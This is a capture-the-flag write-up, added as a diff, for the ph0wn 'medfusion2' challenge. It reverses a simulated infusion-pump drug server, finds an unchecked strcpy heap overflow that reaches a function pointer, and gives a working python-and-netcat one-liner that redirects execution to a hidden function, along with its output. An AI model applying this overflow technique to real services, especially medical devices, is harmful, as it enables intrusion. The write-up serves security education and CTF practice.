@@ -1,0 +1,140 @@
+With medfusion1 we got access to the telnet server running on port 23 of the host.
+
+On this server, we could see a file name "copy_of_drugserver".
+This is a binary we need to reverse to find an exploit and use it on the host.
+
+To get the binary, we can connect to the telnet server and put the output in a tee log:
+telnet medfusion.ph0wn.org 23 | tee telnel.log
+
+On the server, we can use the cat command to output the binary in out log.
+Once done, we remove the extra log from our log file to only keep the binary output.
+Can save this under medfusion2.bin.
+
+Note: In medfusion1, we could see a third service which was a "cdt" on port 7777.
+We assumed it was the medical pump server running on this port.
+This "cdt" service is in fact a hidden telnet server, we can connect to it with:
+telnet medfusion.ph0wn.org 7777
+
+So we got out binary which is a copy of the server running on port 7777.
+We can execute it locally so we can try our exploit against it:
+chmod +x medfusion2.bin
+./medfusion2.bin
+
+Then in another tab we can telnet to it:
+telnet localhost 7777
+
+This is the output of the server when we hit enter after we connect:
+
+therapy is at 0x1fd42a0, f is at 0x1fd42e0 (diff=64) - heading to fp=0x401c48
+--= Ph0wn Drug Server 1.1 =--
+This server provides the adequate drug list and dosage for a given therapy.
+Available commands for Drug Server:
+        therapy xxxxxxxxxxxx : create therapy corresponding to therapy ID (48 bytes)
+        secret : for authorized personel only
+        help : this help
+
+Let's try the secret command:
+secret
+therapy is at 0x1fd42a0, f is at 0x1fd42e0 (diff=64) - heading to fp=0x401b32
+'secret' is for authorized personel only :)
+
+The therapy command:
+therapy 1 
+therapy is at 0x1fd42a0, f is at 0x1fd42e0 (diff=64) - heading to fp=0x401571
+----- INFUSION PUMP THERAPY CONFIG ----
+-            Lidocaine: 41 mL
+-              Aspirin: 21 mL
+----------------------------------------
+
+We can see useful info about "fp" which can makes us think about a "function pointer".
+
+Let's reverse the binary with ghidra.
+We can find the main easily, we then we got the following call graph:
+main -> server -> connection_handler 
+
+In connection_handler, we find a while(true) loop, which is executed while the connection with the client is valid.
+
+First line that caught our attention:
+      sprintf(local_128,"therapy is at %p, f is at %p (diff=%ld) - heading to fp=%p\n",__dest,
+              ppcVar3,(code **)((long)ppcVar3 - (long)__dest),*ppcVar3);
+
+*ppcVar3 is responsible of the "fp" value printed on the screen when we write a command.
+
+A bit later, we can find this:
+        pcVar1 = *ppcVar3;
+        __n = strlen(__dest);
+        __s1 = (char *)(*pcVar1)(__dest,__n & 0xffffffff,__n & 0xffffffff);
+The function pointer is put in pcVar1 and then is called.
+
+Let's see what is actually changing the *ppcVar3 value. We find this:
+      iVar2 = strncmp(__s1,"secret",6);
+      if (iVar2 == 0) {
+        *ppcVar3 = disabled;
+      }
+      iVar2 = strcmp(__s1,"therapy");
+      if (iVar2 == 0) {
+        *ppcVar3 = config_therapy;
+        __s1 = strtok((char *)0x0,(char *)&local_22a);
+        if (__s1 != (char *)0x0) {
+          strcpy(__dest,__s1);
+          __dest[0x30] = '\0';
+        }
+      }
+
+Here we see the "__s1" string is compared with "secret" and "therapy".
+We can assume __s1 in the user input.
+Based on the result of the comparisons, *ppcVar3 is pointing to two different functions "config_therapy" and "disabled".
+
+We can check what those functions are doing.
+I skip the details, but those functions return a string that will be printed on the client output.
+
+At this point, we know the program is executing some functions based on user input.
+Also those function return a string.
+But for now, no info about any secret flag...
+
+Let's explore the functions found by ghidra.
+One caught our attention, a function called "secret".
+This function does basically the same thing that the two others, but never gets called.
+We can assume this function is supposed to return a string with the flag in it.
+
+Now, how can we make the server call this function ?
+We have a function pointer...which is assigned after user input...
+Maybe we can overflow the input buffer and overwrite the function pointer to point to our secret function ??
+
+In the beginning of the function, we see pccVar3 is allocated on the heap, as well as "__dest" :
+  __dest = (char *)malloc(0x31);
+  ppcVar3 = (code **)malloc(8);
+
+__dest is used to store the user argument to the "therapy" command:
+      if (iVar2 == 0) {
+        *ppcVar3 = config_therapy;
+        __s1 = strtok((char *)0x0,(char *)&local_22a);
+        if (__s1 != (char *)0x0) {
+          strcpy(__dest,__s1);
+          __dest[0x30] = '\0';
+        }
+      }
+__s1 contains the user argument and is copied to __dest buffer.
+And there's no check about __s1 size, which means we could overflow __dest buffer.
+Moreover, __dest is allocated on the heap right before the function pointer.
+That's it ! We've got our vulnerability.
+
+But how much bytes should we input in order to overwrite the function pointer ?
+The server gave us a hint previously:
+therapy is at 0x1fd42a0, f is at 0x1fd42e0 (diff=64) - heading to fp=0x401571
+
+"diff=64" tells us pccVar3 is at 64 bytes from the __dest buffer:
+      sprintf(local_128,"therapy is at %p, f is at %p (diff=%ld) - heading to fp=%p\n",__dest,
+              ppcVar3,(code **)((long)ppcVar3 - (long)__dest),*ppcVar3);
+
+So now we can input our 64 characters + the address of the secret function:
+(python -c 'print "therapy " + "a"*64 + "\xc2\x19\x40\x00" ') | nc localhost 7777
+
+therapy is at 0x1fd42a0, f is at 0x1fd42e0 (diff=64) - heading to fp=0x4019c2
+This is the Secret Therapy ID: id{this_is_a_fake_therapy_id____absolutely_fake}
+
+We've got it ! The server executed the secret function for us and gave us a fake ID (on our local copy of the server).
+
+We can now run the exact same exploit on the real host and get the hidden therapy ID.
+Once we get the ID, we can run the command "therapy <id we just got>" and it will display a list of medical drugs.
+Take first character of each line, and you'll get your flag.
